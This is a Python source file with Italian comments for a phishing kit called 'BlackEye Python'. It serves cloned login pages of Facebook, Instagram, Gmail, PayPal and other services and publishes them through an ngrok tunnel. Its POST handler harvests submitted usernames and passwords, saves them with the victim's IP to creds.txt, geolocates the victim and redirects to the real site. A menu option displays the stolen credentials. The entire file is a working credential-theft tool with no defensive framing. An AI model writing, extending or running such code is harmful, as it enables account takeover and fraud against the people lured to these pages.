import os
import http.server
import socketserver
import threading
from datetime import datetime
import pyngrok.ngrok as ngrok
import requests
import webbrowser
from urllib.parse import parse_qs, urlparse

# Configurazione
SITES = {
    "1": {"name": "Facebook", "html": "facebook.html", "redirect": "https://facebook.com"},
    "2": {"name": "Instagram", "html": "instagram.html", "redirect": "https://instagram.com"},
    "3": {"name": "Gmail", "html": "gmail.html", "redirect": "https://mail.google.com"},
    "4": {"name": "LinkedIn", "html": "linkedin.html", "redirect": "https://linkedin.com"},
    "5": {"name": "YouTube", "html": "youtube.html", "redirect": "https://youtube.com"},
    "6": {"name": "Netflix", "html": "netflix.html", "redirect": "https://netflix.com"},
    "7": {"name": "PayPal", "html": "paypal.html", "redirect": "https://paypal.com"},
}

PORT = 8000
HTML_FOLDER = "html_pages"

class PhishingHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        path = self.path.split('?')[0]
        
        # Pagina principale
        if path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            options = "\n".join([f'<li><a href="/{site_id}">{data["name"]}</a></li>' 
                                for site_id, data in SITES.items()])
            
            self.wfile.write(f"""
                <h1>BlackEye Python</h1>
                <p>Scegli un sito da clonare:</p>
                <ul>{options}</ul>
            """.encode())
            return
        
        # Pagina di phishing
        elif path[1:] in SITES:
            site_id = path[1:]
            site_data = SITES[site_id]
            
            try:
                with open(os.path.join(HTML_FOLDER, site_data["html"]), 'rb') as f:
                    content = f.read()
                
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(content)
                return
                
            except FileNotFoundError:
                self.send_error(404, f"File {site_data['html']} non trovato in {HTML_FOLDER}")
                return
        
        self.send_error(404, "Pagina non trovata")
    
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode()
        data = parse_qs(post_data)
        
        # Estrai site_id dall'URL (es: /1/login -> site_id=1)
        site_id = self.path.split('/')[1]
        
        if site_id in SITES:
            username = data.get('username', [''])[0]
            password = data.get('password', [''])[0]
            ip = self.client_address[0]
            
            save_credentials(SITES[site_id]["name"], username, password, ip)
            ip_info = get_ip_info(ip)
            
            print(f"\n[!] Nuova vittima su {SITES[site_id]['name']}!")
            print(f"IP: {ip} ({ip_info['city']}, {ip_info['country']})")
            print(f"Username: {username}")
            print(f"Password: {password}\n")
            
            # Reindirizza al sito vero
            self.send_response(302)
            self.send_header('Location', SITES[site_id]["redirect"])
            self.end_headers()
            return
        
        self.send_error(404, "Sito non valido")

def save_credentials(site, username, password, ip):
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open("creds.txt", "a") as f:
        f.write(f"[{now}] {site.upper()} - IP: {ip}\n")
        f.write(f"Username: {username}\n")
        f.write(f"Password: {password}\n")
        f.write("-" * 50 + "\n")

def get_ip_info(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}").json()
        return {
            "country": response.get("country", "N/A"),
            "city": response.get("city", "N/A"),
            "isp": response.get("isp", "N/A")
        }
    except:
        return {"country": "N/A", "city": "N/A", "isp": "N/A"}

def start_ngrok():
    ngrok_tunnel = ngrok.connect(PORT)
    print(f"\n[+] Link di phishing: {ngrok_tunnel.public_url}\n")
    return ngrok_tunnel.public_url

def check_html_files():
    if not os.path.exists(HTML_FOLDER):
        os.makedirs(HTML_FOLDER)
        print(f"[!] Crea i file HTML nella cartella '{HTML_FOLDER}'!")
        print("I nomi dei file devono corrispondere a quelli nella configurazione.")
        return False
    
    missing_files = []
    for site in SITES.values():
        if not os.path.exists(os.path.join(HTML_FOLDER, site["html"])):
            missing_files.append(site["html"])
    
    if missing_files:
        print("[!] File HTML mancanti nella cartella:")
        for file in missing_files:
            print(f"- {file}")
        return False
    
    return True

def main():
    print("""
    ██████╗ ██╗      █████╗  ██████╗██╗  ██╗███████╗██╗   ██╗███████╗
    ██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝██╔════╝╚██╗ ██╔╝██╔════╝
    ██████╔╝██║     ███████║██║     █████╔╝ █████╗   ╚████╔╝ █████╗  
    ██╔══██╗██║     ██╔══██║██║     ██╔═██╗ ██╔══╝    ╚██╔╝  ██╔══╝  
    ██████╔╝███████╗██║  ██║╚██████╗██║  ██╗███████╗   ██║   ███████╗
    ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝
    """)
    
    if not check_html_files():
        return
    
    # Avvia server in un thread
    os.chdir(HTML_FOLDER)
    handler = PhishingHandler
    httpd = socketserver.TCPServer(("", PORT), handler)
    
    server_thread = threading.Thread(target=httpd.serve_forever)
    server_thread.daemon = True
    server_thread.start()
    
    print(f"[+] Server avviato su porta {PORT}")
    
    # Avvia Ngrok
    ngrok_url = start_ngrok()
    
    # Menu interattivo
    while True:
        print("\nScegli un'opzione:")
        print("1. Apri browser con link Ngrok")
        print("2. Mostra credenziali rubate")
        print("3. Esci")
        
        choice = input("> ")
        
        if choice == "1":
            webbrowser.open(ngrok_url)
        elif choice == "2":
            if os.path.exists("../creds.txt"):
                with open("../creds.txt", "r") as f:
                    print("\n" + f.read())
            else:
                print("\n[!] Nessuna credenziale rubata ancora")
        elif choice == "3":
            print("[+] Uscita...")
            httpd.shutdown()
            ngrok.kill()
            break

if __name__ == '__main__':
    main()